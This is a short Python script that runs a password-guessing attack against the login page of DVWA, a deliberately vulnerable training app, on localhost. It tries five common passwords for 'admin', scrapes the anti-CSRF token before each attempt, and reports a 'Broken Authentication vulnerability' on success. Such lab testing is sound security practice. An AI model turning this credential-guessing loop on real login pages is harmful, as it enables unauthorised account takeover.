import requests 

 

# Configuration 

url = "http://localhost:42001/dvwa/login.php" 

username = "admin" 

passwords = ["password", "admin", "12345", "admin123", "pass123"] 

 

session = requests.Session() 

 

# Try to login with each password 

for password in passwords: 

    page = session.get(url) 

    token_start = page.text.find("user_token") + 20 

    user_token = page.text[token_start:token_start + 32] 

     

    data = { 

        "username": username, 

        "password": password, 

        "Login": "Login", 

        "user_token": user_token 

    } 

     

    response = session.post(url, data=data) 

    if "Welcome to the password protected area admin" in response.text: 

        print(f"Broken Authentication vulnerability detected with password: {password}") 

        break 

else: 

    print("No Broken Authentication vulnerability found with common passwords.") 

 

session.close() 
